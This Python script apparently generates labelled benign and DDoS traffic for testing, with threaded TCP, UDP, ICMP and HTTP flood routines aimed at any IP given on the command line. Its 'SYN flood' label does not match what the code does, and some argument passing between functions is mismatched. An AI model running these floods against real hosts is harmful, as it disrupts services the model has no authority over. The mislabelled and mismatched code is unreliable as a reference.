"""
Traffic Generator for DDoS Testing
Generates both benign and DDoS traffic patterns
"""

import argparse
import random
import time
import threading
import socket
import subprocess
import sys
from typing import List, Optional


class TrafficGenerator:
    """Generate various traffic patterns for testing"""

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.threads: List[threading.Thread] = []

    def _tcp_flood(self, duration: int, pps: int, source_port: Optional[int] = None):
        """TCP SYN flood"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)

        interval = 1.0 / pps if pps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                if source_port:
                    sock.bind(('', source_port))
                sock.connect((self.target_ip, self.target_port))
                sock.send(b'GET / HTTP/1.1\r\nHost: test\r\n\r\n')
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _udp_flood(self, duration: int, pps: int, payload_size: int = 64):
        """UDP flood"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'X' * payload_size

        interval = 1.0 / pps if pps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _icmp_flood(self, duration: int, pps: int):
        """ICMP flood (requires root)"""
        end_time = time.time() + duration
        interval = 1.0 / pps if pps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                subprocess.run(['ping', '-c', '1', '-W', '1', self.target_ip],
                             capture_output=True, timeout=1)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _http_flood(self, duration: int, rps: int):
        """HTTP request flood using curl/wget"""
        end_time = time.time() + duration
        interval = 1.0 / rps if rps > 0 else 0

        while time.time() < end_time and self.running:
            try:
                subprocess.run(['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                               f'http://{self.target_ip}:{self.target_port}/'],
                              capture_output=True, timeout=2)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def _benign_traffic(self, duration: int, rps: int):
        """Generate benign traffic patterns"""
        end_time = time.time() + duration
        interval = 1.0 / rps if rps > 0 else 0

        # Mix of HTTP, DNS, SSH-like traffic
        ports = [80, 443, 53, 22, 5000, 8080]

        while time.time() < end_time and self.running:
            port = random.choice(ports)
            try:
                if port in [80, 443, 5000, 8080]:
                    subprocess.run(['curl', '-s', '-o', '/dev/null',
                                   f'http://{self.target_ip}:{port}/'],
                                  capture_output=True, timeout=2)
                elif port == 53:
                    subprocess.run(['dig', f'@{self.target_ip}', 'example.com'],
                                  capture_output=True, timeout=2)
                elif port == 22:
                    subprocess.run(['nc', '-z', '-w', '1', self.target_ip, '22'],
                                  capture_output=True, timeout=2)
            except:
                pass

            if interval > 0:
                time.sleep(interval)

    def start_ddos(self, attack_type: str, duration: int, intensity: int,
                   num_sources: int = 1):
        """Start DDoS attack"""
        self.running = True

        attack_funcs = {
            'tcp': self._tcp_flood,
            'udp': self._udp_flood,
            'icmp': self._icmp_flood,
            'http': self._http_flood,
        }

        if attack_type not in attack_funcs:
            raise ValueError(f"Unknown attack type: {attack_type}")

        func = attack_funcs[attack_type]
        pps = intensity  # packets per second per source

        print(f"Starting {attack_type.upper()} flood: {duration}s, {pps} pps, {num_sources} sources")

        for i in range(num_sources):
            source_port = 10000 + i if num_sources > 1 else None
            t = threading.Thread(target=func, args=(duration, pps, source_port))
            t.daemon = True
            t.start()
            self.threads.append(t)

        # Wait for completion
        for t in self.threads:
            t.join()

        self.running = False
        print("Attack completed")

    def start_benign(self, duration: int, rps: int = 10):
        """Start benign traffic"""
        self.running = True
        print(f"Starting benign traffic: {duration}s, {rps} rps")

        t = threading.Thread(target=self._benign_traffic, args=(duration, rps))
        t.daemon = True
        t.start()
        self.threads.append(t)

        for t in self.threads:
            t.join()

        self.running = False
        print("Benign traffic completed")

    def start_mixed(self, duration: int, ddos_ratio: float = 0.3,
                    ddos_type: str = 'tcp', ddos_intensity: int = 100,
                    benign_rps: int = 20):
        """Start mixed benign + DDoS traffic"""
        self.running = True
        print(f"Starting mixed traffic: {duration}s, DDoS ratio: {ddos_ratio}")

        # Start benign traffic
        benign_duration = duration
        benign_thread = threading.Thread(target=self._benign_traffic,
                                        args=(benign_duration, benign_rps))
        benign_thread.daemon = True
        benign_thread.start()
        self.threads.append(benign_thread)

        # Start DDoS after short delay
        time.sleep(2)
        if self.running:
            ddos_duration = duration - 2
            attack_funcs = {
                'tcp': self._tcp_flood,
                'udp': self._udp_flood,
                'icmp': self._icmp_flood,
                'http': self._http_flood,
            }
            func = attack_funcs.get(ddos_type, self._tcp_flood)
            ddos_thread = threading.Thread(target=func,
                                          args=(ddos_duration, ddos_intensity))
            ddos_thread.daemon = True
            ddos_thread.start()
            self.threads.append(ddos_thread)

        for t in self.threads:
            t.join()

        self.running = False
        print("Mixed traffic completed")

    def stop(self):
        """Stop all traffic"""
        self.running = False
        for t in self.threads:
            t.join(timeout=2)
        self.threads.clear()


def iperf3_test(target_ip: str, duration: int = 30, parallel: int = 10,
                reverse: bool = False, udp: bool = False, bandwidth: str = '100M'):
    """Run iperf3 benchmark"""
    cmd = ['iperf3', '-c', target_ip, '-t', str(duration), '-P', str(parallel)]

    if reverse:
        cmd.append('-R')
    if udp:
        cmd.extend(['-u', '-b', bandwidth])

    print(f"Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.stderr:
        print(result.stderr, file=sys.stderr)
    return result.returncode == 0


def main():
    parser = argparse.ArgumentParser(description='DDoS Traffic Generator')
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')

    subparsers = parser.add_subparsers(dest='mode', required=True)

    # DDoS attack
    ddos_parser = subparsers.add_parser('ddos', help='DDoS attack')
    ddos_parser.add_argument('--type', choices=['tcp', 'udp', 'icmp', 'http'],
                           default='tcp', help='Attack type')
    ddos_parser.add_argument('--intensity', type=int, default=1000,
                           help='Packets per second per source')
    ddos_parser.add_argument('--sources', type=int, default=1,
                           help='Number of source threads')

    # Benign traffic
    benign_parser = subparsers.add_parser('benign', help='Benign traffic')
    benign_parser.add_argument('--rps', type=int, default=10,
                             help='Requests per second')

    # Mixed traffic
    mixed_parser = subparsers.add_parser('mixed', help='Mixed benign + DDoS')
    mixed_parser.add_argument('--ddos-ratio', type=float, default=0.3,
                            help='Ratio of DDoS traffic')
    mixed_parser.add_argument('--ddos-type', choices=['tcp', 'udp', 'icmp', 'http'],
                            default='tcp', help='DDoS attack type')
    mixed_parser.add_argument('--ddos-intensity', type=int, default=100,
                            help='DDoS packets per second')
    mixed_parser.add_argument('--benign-rps', type=int, default=20,
                            help='Benign requests per second')

    # iperf3
    iperf_parser = subparsers.add_parser('iperf', help='iperf3 benchmark')
    iperf_parser.add_argument('--parallel', type=int, default=10)
    iperf_parser.add_argument('--reverse', action='store_true')
    iperf_parser.add_argument('--udp', action='store_true')
    iperf_parser.add_argument('--bandwidth', default='100M')

    args = parser.parse_args()

    gen = TrafficGenerator(args.target, args.port)

    try:
        if args.mode == 'ddos':
            gen.start_ddos(args.type, args.duration, args.intensity, args.sources)
        elif args.mode == 'benign':
            gen.start_benign(args.duration, args.rps)
        elif args.mode == 'mixed':
            gen.start_mixed(args.duration, args.ddos_ratio, args.ddos_type,
                          args.ddos_intensity, args.benign_rps)
        elif args.mode == 'iperf':
            iperf3_test(args.target, args.duration, args.parallel,
                       args.reverse, args.udp, args.bandwidth)
    except KeyboardInterrupt:
        print("\nStopping...")
        gen.stop()


if __name__ == '__main__':
    main()